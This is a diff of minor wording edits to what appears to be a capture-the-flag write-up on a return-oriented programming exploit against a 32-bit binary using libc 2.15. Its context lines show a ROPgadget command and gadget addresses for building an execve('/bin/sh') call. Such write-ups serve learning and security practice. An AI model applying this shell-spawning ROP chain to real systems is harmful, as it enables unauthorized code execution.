@@ -78,7 +78,7 @@ overwrite some part of the mapped `libc` with custom exploit and jump to that ex
 - return to `system`/`execve` with an argument pointing to `/bin/sh`.
 
 My initial idea was using `gets`, however this resulted in an `SIGSEGV`.
-After some time of exploring in `GDB` I concluded that either the `gets` function wasn't supposed to be directly called
+After some time of exploring in GDB I concluded that either the `gets` function wasn't supposed to be directly called
 from the address associated with its symbol or that it was corrupted since it dereferenced an uninitialized stack value o_0.
 
 Anyway this made me turn to the second approach - targeting `system`/`execve` directly.
@@ -102,7 +102,7 @@ ebx - const char * filename
 ecx - const char * const * argv
 edx - const char * const * envp
 ```
-For `ebx` I targeted the `/bin/sh` address that comes built into `libc`.
+For `ebx` I targeted the `/bin/sh` address that comes built into `libc`:
 ```
 ❯ ROPgadget --binary libc-2.15.so --string /bin/sh
 Strings information
@@ -161,7 +161,7 @@ Bellow is the list of gadgets I used:
 // set edx point to NULL ; zero out eax
 0x00095555 : pop edx ; xor eax, eax ; pop edi ; ret
 
-// eax = 0xb ; set ecx point to NULL
+// set eax to 0xb ; set ecx point to NULL
 0x00074040 : xor eax, eax ; ret
 0x00174a51 : pop ecx ; add al, 0xa ; ret
 0x00097b7a : inc eax ; pop esi ; pop edi ; pop ebp ; ret
